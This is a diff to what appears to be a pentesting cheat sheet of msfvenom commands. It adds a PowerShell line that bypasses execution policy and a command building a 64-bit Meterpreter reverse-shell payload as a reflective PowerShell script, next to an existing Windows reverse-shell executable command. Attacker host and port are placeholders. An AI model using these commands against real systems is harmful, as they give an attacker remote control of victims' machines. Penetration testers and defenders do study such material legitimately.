@@ -31,6 +31,10 @@ Windows
 -------
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=xxxx -f exe > shell.exe 
 
+#powershell
+#powershell -ExecutionPolicy bypass -NoExit -File msf.ps1
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=xxxx -f psh-reflection -o msf.ps1
+
 
 Mac
 ---
